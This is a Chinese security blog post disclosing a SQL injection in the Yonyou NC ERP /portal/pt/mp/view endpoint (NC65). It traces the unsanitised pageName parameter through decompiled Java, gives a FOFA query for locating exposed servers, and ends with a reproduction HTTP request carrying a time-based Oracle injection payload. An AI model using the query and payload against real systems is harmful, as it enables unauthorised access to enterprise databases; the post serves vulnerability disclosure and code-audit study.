---
title: "用友NC /mp/view sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-mp-view-pageName-sqli.html
asset_dir: assets/用友nc-mpview-sql注入漏洞
---

# 用友NC /mp/view sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/15 08:10
- 768浏览
- [0评论](#comment)
- 29分钟阅读

深入探索

数据库管理系统

数据库

漏洞扫描器

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用友网络科技股份有限公司研发的一款大型erp企业管理系统与电子商务平台,专为大中型企业提供企业管理解决方案。它集成了财务、供应链、生产、销售、采购、人力资源等多方面的功能，帮助企业实现数字化管理，提升运营效率。用友NC `/mp/view` 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞,未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看漏洞通告描述

[![用友NC /mp/view sql注入漏洞](images/img-001-304c1959efff.webp)](https://image.mrxn.net/21e772360d944288a82aff35afd38999.webp)

漏洞位置出现在 `MpAction` 的 `view` 方法里

```
public void view() throws PortalServiceException {
        HttpServletRequest req = this.getRequest();
        String systemCode = req.getParameter("pageName");
        if (StringUtils.isBlank(systemCode)) {
            systemCode = "MP";
            LfwLogger.warn("MpAction : param pageName is null, convert to MP ");
        }

        PtCredentialVO credential = this.getCredentialVO((String)null, systemCode);
```

深入探索

Windows安全工具

漏洞修复方案

VPN服务

用户可控参数 `pageName` 带入 `getCredentialVO` 方法

```
private PtCredentialVO getCredentialVO(String portletId, String systemCode) throws PortalServiceException {
        Integer sharelevel = 1;
        IUserVO userVO = ((PtSessionBean)LfwRuntimeEnvironment.getLfwSessionBean()).getUser();
        String userId = userVO.getUserid();
        PtCredentialVO credential = PintServiceFactory.getSsoQryService().getCredentials(userId, portletId, systemCode, sharelevel);
```

然后又带入 `getCredentials` 方法，这里需要注意的是有权限检测 `LfwRuntimeEnvironment.getLfwSessionBean(` ，因此这个漏洞需要登录后进行利用。

代码安全审计

```
public PtCredentialVO getCredentials(String userId, String portletId, String className, Integer sharelevel) throws PortalServiceException {
        PtBaseDAO dao = new PtBaseDAO();

        try {
            PtSlotVO[] slots = this.getSlots(userId, portletId, className, sharelevel);
            if (slots != null && slots.length != 0) {
```

跟进 `getSlots` 方法

```
public PtSlotVO[] getSlots(String userId, String portletId, String className, Integer sharelevel) throws PortalServiceException {
        if (sharelevel == null) {
            sharelevel = 1;
        }

        StringBuffer slotWhere = new StringBuffer();
        slotWhere.append(" sharelevel = ");
        slotWhere.append(sharelevel == null ? 1 : sharelevel);
        if (null != sharelevel) {
            if (sharelevel == 0) {
                if (portletId != null && !portletId.trim().equals("")) {
                    slotWhere.append(" and portletid = '" + portletId + "' ");
                }

                if (userId != null && !userId.trim().equals("")) {
                    slotWhere.append(" and userid = '" + userId + "' ");
                }
            } else if (sharelevel == 1) {
                if (className != null && !className.trim().equals("")) {
                    slotWhere.append(" and classname = '" + className + "' ");
                }
```

在上面的 `getCredentialVO` 方法里，`Integer sharelevel = 1;` ，这里判断 `className` 非空且非null 就直接将其拼接在sql语句中了，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 漏洞利用示例
>
> 漏洞预警服务

```
POST /portal/pt/mp/view HTTP/1.1
Host: nc65.mrxn.net
Cookie: 你的cookie
Content-Type: application/x-www-form-urlencoded

pageName=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

网络安全
